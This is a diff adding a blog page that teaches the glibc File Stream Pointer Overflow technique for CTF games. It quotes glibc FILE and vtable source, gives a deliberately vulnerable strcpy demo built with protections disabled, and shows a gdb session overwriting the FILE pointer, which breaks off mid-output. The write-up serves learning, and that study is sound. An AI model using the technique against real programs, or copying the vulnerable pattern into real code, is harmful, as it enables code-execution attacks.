@@ -1,0 +1,876 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next pisces">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="overflow,FSPO,_IO_list_all," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/w0lfzhang.ico?v=5.0.2" />
+
+
+
+
+
+
+<meta name="description" content="Recently I learned 2 exploiting ways which were very useful in ctf games.  FSPO–&amp;gt;File Stream Pointer OverflowWhen a new FILE structure is allocated and its pointer returned from fopen(), glibc has">
+<meta name="keywords" content="overflow,FSPO,_IO_list_all">
+<meta property="og:type" content="article">
+<meta property="og:title" content="File Stream Pointer Overflow">
+<meta property="og:url" content="http://yoursite.com/2016/11/19/File-Stream-Pointer-Overflow/index.html">
+<meta property="og:site_name" content="w0lfzhang&#39;s blog">
+<meta property="og:description" content="Recently I learned 2 exploiting ways which were very useful in ctf games.  FSPO–&amp;gt;File Stream Pointer OverflowWhen a new FILE structure is allocated and its pointer returned from fopen(), glibc has">
+<meta property="og:image" content="http://of38fq57s.bkt.clouddn.com/struct__IO__FILE__plus__coll__graph.png">
+<meta property="og:image" content="http://of38fq57s.bkt.clouddn.com/_IO_FIlE.png">
+<meta property="og:updated_time" content="2017-11-16T13:43:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="File Stream Pointer Overflow">
+<meta name="twitter:description" content="Recently I learned 2 exploiting ways which were very useful in ctf games.  FSPO–&amp;gt;File Stream Pointer OverflowWhen a new FILE structure is allocated and its pointer returned from fopen(), glibc has">
+<meta name="twitter:image" content="http://of38fq57s.bkt.clouddn.com/struct__IO__FILE__plus__coll__graph.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2016/11/19/File-Stream-Pointer-Overflow/"/>
+
+
+  <title> File Stream Pointer Overflow | w0lfzhang's blog </title>
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="en">
+
+  
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-86514506-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?c3be9cb478c70b5f3b819ddd0ba381b6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">w0lfzhang's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">pwn, pwn, pwn!!!</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                File Stream Pointer Overflow
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2016-11-19T03:53:31+08:00" content="2016-11-19">
+              2016-11-19
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/misc-exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">misc_exploit</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/11/19/File-Stream-Pointer-Overflow/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/11/19/File-Stream-Pointer-Overflow/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+	 
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Recently I learned 2 exploiting ways which were very useful in ctf games. </p>
+<h2 id="FSPO–-gt-File-Stream-Pointer-Overflow"><a href="#FSPO–-gt-File-Stream-Pointer-Overflow" class="headerlink" title="FSPO–&gt;File Stream Pointer Overflow"></a>FSPO–&gt;File Stream Pointer Overflow</h2><p>When a new FILE structure is allocated and its pointer returned from fopen(), glibc has actually allocated an internal structure called struct _IO_FILE_plus, which contains struct _IO_FILE and a pointer to struct _IO_jump_t, which in turn contains a list of pointers for all the functions attached to the FILE. This is its vtable, which, just like C++ vtables, is used whenever any stream function is called with the FILE.</p>
+<h3 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h3><a id="more"></a>
+<p>First let’a see some important structures which are playing a key role in FSPO.<br>Definition of _IO_list_all： (because it’s related to the program pwn450 in Shanghai Security Contest, I wrote down)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span> = &amp;_<span class="title">IO_2_1_stderr_</span>;</span></div></pre></td></tr></table></figure></p>
+<p>Definition of _IO_FILE_plus：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></div><div class="line">   This contains a pointer to the function jump table used.</div><div class="line">   This is for compatibility with C++ streambuf; the word can</div><div class="line">   be used to smash to a pointer to a virtual function table. */</div><div class="line"> </div><div class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></div><div class="line">&#123;</div><div class="line">    _IO_FILE file;</div><div class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></div><div class="line">&#123;</div><div class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</div><div class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</div><div class="line">    JUMP_FIELD(_IO_finish_t, __finish);</div><div class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</div><div class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</div><div class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</div><div class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</div><div class="line">    <span class="comment">/* showmany */</span></div><div class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</div><div class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</div><div class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</div><div class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</div><div class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</div><div class="line">    JUMP_FIELD(_IO_sync_t, __sync);</div><div class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</div><div class="line">    JUMP_FIELD(_IO_read_t, __read);</div><div class="line">    JUMP_FIELD(_IO_write_t, __write);</div><div class="line">    JUMP_FIELD(_IO_seek_t, __seek);</div><div class="line">    JUMP_FIELD(_IO_close_t, __close);</div><div class="line">    JUMP_FIELD(_IO_stat_t, __stat);</div><div class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</div><div class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</div><div class="line"> <span class="meta">#<span class="meta-keyword">if</span> 0</span></div><div class="line">    get_column;</div><div class="line">    set_column;</div><div class="line"> <span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">/*Initialize the _IO_file_jumps*/</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP_INIT(NAME, VALUE) VALUE</span></div><div class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> =</span></div><div class="line">&#123;</div><div class="line">   JUMP_INIT_DUMMY,</div><div class="line">   JUMP_INIT(finish, _IO_file_finish),</div><div class="line">   JUMP_INIT(overflow, _IO_file_overflow),</div><div class="line">   JUMP_INIT(underflow, _IO_file_underflow),</div><div class="line">   JUMP_INIT(uflow, _IO_default_uflow),</div><div class="line">   JUMP_INIT(pbackfail, _IO_default_pbackfail),</div><div class="line">   JUMP_INIT(xsputn, _IO_file_xsputn),</div><div class="line">   JUMP_INIT(xsgetn, _IO_file_xsgetn),</div><div class="line">   JUMP_INIT(seekoff, _IO_new_file_seekoff),</div><div class="line">   JUMP_INIT(seekpos, _IO_default_seekpos),</div><div class="line">   JUMP_INIT(setbuf, _IO_new_file_setbuf),</div><div class="line">   JUMP_INIT(sync, _IO_new_file_sync),</div><div class="line">   JUMP_INIT(doallocate, _IO_file_doallocate),</div><div class="line">   JUMP_INIT(read, _IO_file_read),</div><div class="line">   JUMP_INIT(write, _IO_new_file_write),</div><div class="line">   JUMP_INIT(seek, _IO_file_seek),</div><div class="line">   JUMP_INIT(close, _IO_file_close),</div><div class="line">   JUMP_INIT(stat, _IO_file_stat),</div><div class="line">   JUMP_INIT(showmanyc, _IO_default_showmanyc),</div><div class="line">   JUMP_INIT(imbue, _IO_default_imbue)</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> </span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></div><div class="line">  <span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></div><div class="line"> </div><div class="line">    <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></div><div class="line">    <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></div><div class="line">    <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></div><div class="line">    <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></div><div class="line">    <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></div><div class="line">    <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></div><div class="line">    <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></div><div class="line">    <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></div><div class="line">    <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></div><div class="line">    <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></div><div class="line">    <span class="comment">/* The following fields are used to support backing up and undo. */</span></div><div class="line">    <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></div><div class="line">    <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></div><div class="line">    <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></div><div class="line"> </div><div class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></div><div class="line"> </div><div class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></div><div class="line"> </div><div class="line">    <span class="keyword">int</span> _fileno;</div><div class="line">  <span class="meta">#<span class="meta-keyword">if</span> 0</span></div><div class="line">    <span class="keyword">int</span> _blksize;</div><div class="line">  <span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">    <span class="keyword">int</span> _flags2;</div><div class="line">  <span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></div><div class="line"> </div><div class="line">  <span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></div><div class="line">    <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</div><div class="line">    <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</div><div class="line">    <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</div><div class="line"> </div><div class="line">    <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></div><div class="line"> </div><div class="line">    _IO_lock_t *_lock;</div><div class="line">  <span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p>So here is the picture:<br><img src="http://of38fq57s.bkt.clouddn.com/struct__IO__FILE__plus__coll__graph.png"></p>
+<p>And above is just the definition of some key structure. We must figure out how they work first and then to exploit!</p>
+<p>OK! Go on my trip. </p>
+<p>Reading its source code cost much time, but it’s worth to do that!<br>First let’s figure out what exactly stdin, stdout and stderr are.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">FILE</span>;</span></div><div class="line"></div><div class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdin_</span>;</span></div><div class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdout_</span>;</span></div><div class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stderr_</span>;</span></div><div class="line"></div><div class="line">_IO_FILE *<span class="built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;</div><div class="line">_IO_FILE *<span class="built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;</div><div class="line">_IO_FILE *<span class="built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;</div><div class="line"></div><div class="line"><span class="meta">#  <span class="meta-keyword">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \</span></div><div class="line">  struct _IO_FILE_plus NAME \</div><div class="line">    = &#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, NULL), \</div><div class="line">      &amp;_IO_file_jumps&#125;;</div><div class="line"></div><div class="line">DEF_STDFILE(_IO_2_1_stdin_, <span class="number">0</span>, <span class="number">0</span>, _IO_NO_WRITES);</div><div class="line">DEF_STDFILE(_IO_2_1_stdout_, <span class="number">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);</div><div class="line">DEF_STDFILE(_IO_2_1_stderr_, <span class="number">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);</div></pre></td></tr></table></figure></p>
+<p>Let’s have a look of FILEBUF_LITERAL. It will initialize _IO_FILE.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#  <span class="meta-keyword">define</span> FILEBUF_LITERAL(CHAIN, FLAGS, FD, WDP) \</span></div><div class="line">      &#123; _IO_MAGIC+_IO_LINKED+_IO_IS_FILEBUF+FLAGS, \</div><div class="line">  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, (_IO_FILE *) CHAIN, FD, \</div><div class="line">  0, _IO_pos_BAD, 0, 0, &#123; 0 &#125;, 0, _IO_pos_BAD, \</div><div class="line">  0 &#125;</div></pre></td></tr></table></figure></p>
+<p>According to _IO_FILE, the value of FD is assigned to _fileno field of _IO_FILE structure. To be honest, it’s just a little bit useful to our exploit just mentioned above. I just want to know what stdin, stdout and stderr are!</p>
+<p>Next let’s turn to _IO_jump_t…. OK, it’s kind of complex, so I have to read the source of glibc. And next I will analyse the function of fputs to find out how _IO_jump_t works.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span></div><div class="line">_IO_fputs (str, fp)</div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *str;</div><div class="line">    _IO_FILE *fp;</div><div class="line">&#123;</div><div class="line">    _IO_size_t len = <span class="built_in">strlen</span> (str);</div><div class="line">    <span class="keyword">int</span> result = EOF;</div><div class="line">    CHECK_FILE (fp, EOF);</div><div class="line">    _IO_acquire_lock (fp);</div><div class="line">    <span class="keyword">if</span> ((_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</div><div class="line">        &amp;&amp; _IO_sputn (fp, str, len) == len)</div><div class="line">        result = <span class="number">1</span>;</div><div class="line">    _IO_release_lock (fp);</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></div><div class="line"></div><div class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></div><div class="line">  (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS ((struct _IO_FILE_plus *) (THIS)) \</div><div class="line">                + (THIS)-&gt;_vtable_offset))</div></pre></td></tr></table></figure>
+<p>As we can see, the function _IO_file_xsputn is executed when calling fputs(). I aslo checked some other functions: for example, fread() will call _IO_file_xsgetn, fclose() will call _IO_file_finish and so on.</p>
+<p> What I want to say is that the table is very important to _IO_FILE. It contains the addresses of some related functions that will be executed in different situations. And what we will do is to overwrite the vtable and gain the control of execution flow to execute our expected function or shellcode.<br><img src="http://of38fq57s.bkt.clouddn.com/_IO_FIlE.png"></p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Now we’ve understood the theory and next we will take a demo to show how to exploit using this tech.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">   FILE *test;</div><div class="line">   <span class="keyword">char</span> msg[] = <span class="string">"no segfault yet/n"</span>;</div><div class="line">   <span class="keyword">char</span> stage[<span class="number">1024</span>];</div><div class="line">   <span class="keyword">if</span>(argc &lt; <span class="number">2</span>) &#123;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"usage : %s &lt;argument&gt;/n"</span>, argv[<span class="number">0</span>]);</div><div class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">   &#125;</div><div class="line">   test = fopen(<span class="string">"temp"</span>, <span class="string">"a"</span>);</div><div class="line">   <span class="built_in">strcpy</span>(stage, argv[<span class="number">1</span>]);</div><div class="line">   <span class="built_in">fprintf</span>(test, <span class="string">"%s"</span>, msg);</div><div class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>By default, DEP and stack protector are closed:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -fno-stack-protector -z execstack -o file file.c</div></pre></td></tr></table></figure></p>
+<p>The content of input buffer should be:<br>[1]{ Fake FILE Stream Structure }—&gt;[2]{ Fake jumptable }—&gt;[3]{ Shellcode }—&gt;[4]{ Addresses of the Fake FILE Stream Structure }<br>But personally, I think it didn’t work according to the File Stream Pointer Overflows Paper when the fake FILE structure is filled with the address of jumptalbe.(I’ve tried many times!). So I will change a mind.</p>
+<p>Fisrt let’s calculate the distance between variable stage and test. It’s 1042 bytes. So we can overwrite the FILE pointer test:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="meta">gdb-peda$</span> r `python -c 'print "a"*1042 + "AAAA"'`</div><div class="line">Starting program: /home/wolfzhang/Desktop/file `python -c 'print "a"*1042 + "AAAA"'`</div><div class="line">len: 1042</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line"></div><div class="line"> [----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0x16 </div><div class="line">EBX: 0xb7fc0000 --&gt; 0x1a9da8 </div><div class="line">ECX: 0x8048500 (&lt;main+19&gt;:	outs   dx,BYTE PTR ds:[esi])</div><div class="line">EDX: 0x100 </div><div class="line">ESI: 0x41414141 ('AAAA')</div><div class="line">EDI: 0x16 </div><div class="line">EBP: 0xbfffebb8 --&gt; 0x0 </div><div class="line">ESP: 0xbfffe750 --&gt; 0xbfffeb9a ('a' &lt;repeats 18 times&gt;, "AAAA")</div><div class="line">EIP: 0xb7e7a0c4 (&lt;__GI__IO_fputs+36&gt;:	mov    eax,DWORD PTR [esi])</div><div class="line">EFLAGS: 0x10212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0xb7e7a0ba &lt;__GI__IO_fputs+26&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">   0xb7e7a0bd &lt;__GI__IO_fputs+29&gt;:	call   0xb7e90d20 &lt;__strlen_ia32&gt;</div><div class="line">   0xb7e7a0c2 &lt;__GI__IO_fputs+34&gt;:	mov    edi,eax</div><div class="line">=&gt; 0xb7e7a0c4 &lt;__GI__IO_fputs+36&gt;:	mov    eax,DWORD PTR [esi]</div><div class="line">   